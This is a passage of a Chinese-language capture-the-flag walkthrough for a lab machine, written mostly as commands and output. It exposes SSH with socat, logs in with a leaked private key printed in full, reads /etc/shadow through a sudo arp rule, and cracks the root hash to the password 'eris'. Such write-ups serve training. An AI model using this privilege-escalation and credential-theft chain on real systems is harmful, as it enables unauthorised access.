+使用本机 `socat `转发端口，将只能本机访问的`127.0.0.1:22`转发到外部网络`0.0.0.0:2222`
+
+```shell
+#which socat
+/usr/bin/socat
+kali└─# tldr socat
+   sudo socat TCP-LISTEN:80,fork TCP4:www.example.com:80
+#socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22&
+#将本地端口 2222 的入站 TCP 流量转发到本机（127.0.0.1）的 22 端口
+#netstat -anlptu
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3002          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      2659/node
+tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      2749/socat
+tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.31.25:40561     192.168.31.126:1234     ESTABLISHED 2731/sh
+tcp        0      0 192.168.31.25:3000      192.168.31.126:56472    ESTABLISHED 2659/node
+tcp6       0      0 ::1:3001                :::*                    LISTEN      2664/node
+tcp6       0      0 ::1:3001                ::1:35602               ESTABLISHED 2664/node
+tcp6       0      0 ::1:35602               ::1:3001                ESTABLISHED 2659/node
+```
+
+转出` SSH `端口后，就可以用获得的` SSH `私钥登陆了
+
+```shell
+└─# echo '------BEGIN OPENSSH PRIVATE KEY-----
+-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
+-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
+-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
+-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
+------END OPENSSH PRIVATE KEY-----'>id
+└─# chmod 600 id
+└─# ssh hana@$IP -p 2222 -i id
+#登录失败，私钥每行多了个`-`
+└─# cat id | sed 's/^.//g'>id2
+
+└─# cat id2
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
+5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
+AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
+WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+└─# chmod 600 id2
+└─# ssh hana@$IP -p 2222 -i id2
+devoops:~$ id
+uid=1001(hana) gid=100(users) groups=100(users),100(users)
+
+```
+
+##### 拿到`user.txt`
+
+```shell
+devoops:~$ id
+uid=1001(hana) gid=100(users) groups=100(users),100(users)
+devoops:~$ cd
+devoops:~$ ls
+user.flag
+devoops:~$ cat user.flag
+
+```
+
+
+
+### 获得root
+
+`sudo`发现 hana 用户能够以 `root `身份运行 `/sbin/arp`
+
+```shell
+devoops:~$ sudo -l
+Matching Defaults entries for hana on devoops:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for hana:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User hana may run the following commands on devoops:
+    (root) NOPASSWD: /sbin/arp
+```
+
+[[查阅](https://gtfobins.github.io/)](https://gtfobins.github.io/)` GTFObins`，发现 `arp` 可以用于任意文件读取
+
+```shell
+devoops:~$ sudo arp -v -f "/root/root.flag"
+arp: cannot open etherfile /root/root.flag !
+```
+
+发现没有` root.txt `和` root.flag`
+尝试读取` /etc/shadow`
+
+```shell
+devoops:~$ sudo arp -v -f "/etc/shadow"
+>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
+.....
+runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
+arp: format error on line 20 of etherfile /etc/shadow !
+>> hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::
+
+devoops:~$
+```
+
+发现了` root` 用户的 `shadow`
+
+```shell
+root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
+```
+
+使用 `john`爆破`hash`
+
+```shell
+└─# echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::'>shad.txt
+
+┌──(root㉿LAPTOP-FAMILY)-[/tmp]
+└─# john shad.txt --wordlist=/usr/share/wordlists/rockyou.txt
+#rockyou.txt太久了换个作者喜欢的字典就很快
+└─# john shad.txt --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 24 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+eris             (root)
+1g 0:00:00:02 DONE (2025-05-30 00:41) 0.4032g/s 44593p/s 44593c/s 44593C/s likewise..28102005
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+找到 `root` 密码为` eris`
+
+##### 拿到`root.txt`
+
+```shell
+devoops:~$ su -
+Password:#eris
+devoops:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+devoops:~#
+devoops:~# cd
+devoops:~# ls
+N073.7X7              R007.7x7oOoOoOoOoOoO
+devoops:~# cat R007.7x7oOoOoOoOoOoO
+
+```
